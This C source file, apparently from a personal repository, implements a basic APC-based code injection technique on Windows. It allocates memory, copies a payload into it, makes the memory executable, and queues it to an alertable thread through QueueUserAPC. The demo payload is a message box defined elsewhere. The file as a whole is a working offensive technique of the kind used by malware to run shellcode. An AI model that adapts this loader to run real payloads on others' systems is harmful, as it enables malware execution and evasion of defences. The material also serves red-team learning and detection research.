/**
 * Author : Yekuuun
 * Gihtub : https://github.com/Yekuuun
 * 
 * Base code injection using APC based technique.
 */

#include "apc.h";

//Wrapper.
DWORD WINAPI ThreadFunctionSleepEx(LPVOID lpParam){
    SleepEx(INFINITE, TRUE);
    return 0;
}

/**
 * APC inject.
 * @param hThread => previously created thread.
 * @param pPayload => payload to execute.
 * @param sPayloadSize => size of payload.
 */
BOOL InjectViaApc(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize){
    LPVOID Buffer = NULL;
    DWORD dwOldProtection = 0;   

    //allocate mem
    Buffer = VirtualAlloc(NULL, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(Buffer == NULL){
        printf("[!] Unable to allocate virtual memory\n");
        return FALSE;
    }

    memcpy(Buffer, pPayload, sPayloadSize);

    if (!VirtualProtect(Buffer, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect failed. \n");
        VirtualFree(Buffer, 0, MEM_RELEASE);
		return FALSE;
	}

    printf("\n[#] Press <Enter> To Run ... ");
	getchar();

	// if `hThread` is in an alertable state, QueueUserAPC will run the payload directly
	// if `hThread` is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC((PAPCFUNC)Buffer, hThread, NULL)) {
		printf("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        VirtualFree(Buffer, 0, MEM_RELEASE);
		return FALSE;
	}

    return TRUE;
}

//test
int main(){
    HANDLE hThread    = NULL;
    DWORD  dwThreadId = 0;

    hThread = CreateThread(NULL, NULL, ThreadFunctionSleepEx, NULL, NULL, &dwThreadId);
    if(hThread == NULL){
        printf("[!] Error creating new thread. \n");
        return EXIT_FAILURE;
    }

    printf("[*] Alertable thread created with id : %d \n", dwThreadId);
    printf("[*] Running injection using API method. \n");

    if(!InjectViaApc(hThread, MessageBoxAPayload, sizeof(MessageBoxAPayload))){
        printf("[!] Error running injection.\n");
        CloseHandle(hThread);

        return EXIT_FAILURE;
    }
    
    WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

    CloseHandle(hThread);

    return EXIT_SUCCESS;
}